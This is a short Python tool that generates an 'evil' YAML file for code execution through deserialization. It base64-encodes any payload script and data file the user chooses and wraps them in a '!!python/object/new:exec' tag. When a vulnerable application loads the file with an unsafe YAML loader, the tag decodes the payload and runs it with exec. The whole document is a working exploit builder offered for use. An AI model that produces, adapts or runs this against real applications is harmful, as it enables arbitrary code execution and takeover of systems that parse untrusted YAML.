#!/usr/bin/env python3

from sys import argv
from base64 import b64encode


USAGE = "[+] Usage: {} <payload-script> <data-file>"

DEFAULT_OUT_PATH = "evil_yaml"

# Evil yaml format
# Upon execution, external_data_b64 will be available as a variable in the payload script
EVIL_YAML_TEMPLATE="""!!python/object/new:exec """ 											+ \
""" [ "payload_b64 = b'{0}'; external_data_b64 = b'{1}'; """ 								+ \
"""    from base64 import b64decode; payload = b64decode(payload_b64).decode('utf8'); """ 	+ \
"""    exec(payload)" ]"""


def readfile(path, mode):
	with open(path, mode) as f:
		data = f.read()
	return data


def main():
	if len(argv) < 3:
		print(USAGE.format(argv[0]))
		return

	# Optional out path for the evil yaml
	if len(argv) > 3:
		out_path = argv[3]
	else:
		out_path = DEFAULT_OUT_PATH

	payload_path = argv[1]
	data_path = argv[2]
	print("[+] Creating evil yaml with payload '{}' and data '{}'".format(payload_path, data_path))

	# Read payload file and data file
	try:
		payload = readfile(payload_path, "rb")
		data = readfile(data_path, "rb")
	except FileNotFoundError as e:
		print("[!] {}".format(str(e)))
		return

	# Base64 encode
	encoded_payload = str(b64encode(payload), "ascii")
	encoded_data = str(b64encode(data), "ascii")

	# Inject encoded payload and data into evil yaml format
	evil_yaml = EVIL_YAML_TEMPLATE.format(encoded_payload, encoded_data)

	with open(out_path, "w") as outfile:
		outfile.write(evil_yaml)

	print("[+] Done, evil yaml at {}".format(out_path))


if __name__ == "__main__":
	main()
